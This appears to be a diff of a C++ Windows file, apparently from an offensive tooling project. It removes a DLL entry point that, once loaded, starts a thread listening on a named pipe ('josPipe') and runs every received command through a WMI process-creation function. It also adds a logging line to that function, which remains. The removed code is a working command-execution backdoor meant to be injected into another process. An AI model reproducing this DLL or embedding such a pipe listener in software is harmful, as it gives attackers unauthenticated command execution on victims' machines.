@@ -1,22 +1,6 @@
-﻿// dllmain.cpp : 定义 DLL 应用程序的入口点。
+#include "wmi.h"
 
-#include<Windows.h>
-#include <comdef.h>
-#include <Wbemidl.h>
-#include <iostream>
-#define BUFF_SIZE 1024
-#pragma comment(lib, "wbemuuid.lib")
 using namespace std;
-
-/// <summary>
-/// Create Pipe
-/// </summary>
-/// 
-/// 
-/// 
-/// 
-WCHAR ptsPipeName[] = L"\\\\.\\pipe\\josPipe";
-DWORD dwThreadId = 0;
 
 int WMICCreateProcess(PWCHAR Command)
 {
@@ -24,7 +8,7 @@ int WMICCreateProcess(PWCHAR Command)
 
     // Step 1: --------------------------------------------------
     // Initialize COM. ------------------------------------------
-
+    wcout << L"[+] Get Command : " << Command << endl;
     hres = CoInitializeEx(0, COINIT_MULTITHREADED);
     if (FAILED(hres))
     {
@@ -203,77 +187,3 @@ int WMICCreateProcess(PWCHAR Command)
     CoUninitialize();
     return 0;
 }
-
-
-
-wchar_t* char2wchar(const char* cchar)
-{
-    wchar_t* m_wchar;//定义宽字指针
-    //取多字长度
-    int len = MultiByteToWideChar(
-        CP_ACP, //代码面
-        0, //标志
-        cchar, //多字字符串
-        strlen(cchar),//多字字符串长度 
-        NULL,//宽字字符串 
-        0);//宽字字符串长度
-    m_wchar = new wchar_t[len + 1];//为宽字指针分配内存
-    ZeroMemory(m_wchar, len + 1);
-    MultiByteToWideChar(CP_ACP, 0, cchar, strlen(cchar), m_wchar, len);//复制多字到宽字
-    m_wchar[len] = '\0';//字符串结尾
-    return m_wchar;//返回指针
-}
-
-DWORD HandleCode(VOID) {
-    HANDLE hPipe;
-    DWORD dwError;
-    DWORD dwLen;
-    hPipe = CreateNamedPipe(
-        ptsPipeName,
-        PIPE_ACCESS_DUPLEX,
-        PIPE_WAIT| PIPE_TYPE_MESSAGE |PIPE_TYPE_BYTE| PIPE_READMODE_MESSAGE,
-        PIPE_UNLIMITED_INSTANCES,
-        BUFF_SIZE,
-        BUFF_SIZE,
-        0,
-        NULL);
-   if (hPipe == INVALID_HANDLE_VALUE) {
-       dwError = GetLastError();
-       wprintf(L"[-] Create Pipe Error : %d \n", dwError);
-       return dwError;
-   }
-   wprintf(L"[+] Create Pipe Success : %s \n", ptsPipeName);
-   for (;;) {
-       if (ConnectNamedPipe(hPipe, NULL) > 0) {
-           CHAR szBuffer[BUFF_SIZE];
-           ZeroMemory(szBuffer, BUFF_SIZE);
-           wprintf(L"[+] Client Connected...\n");
-           ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
-           wprintf(L"[+] Get Command  : %s \n", szBuffer);
-           WMICCreateProcess(char2wchar(szBuffer));
-           DisconnectNamedPipe(hPipe);
-       }
-   }
-   
-}
-
-
-
-BOOL APIENTRY DllMain( HMODULE hModule,
-                       DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-                     )
-{
-    switch (ul_reason_for_call)
-    {
-    case DLL_PROCESS_ATTACH:
-        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HandleCode, NULL, NULL, &dwThreadId);
-        break;
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-    case DLL_PROCESS_DETACH:
-        break;
-    }
-    return TRUE;
-}
-
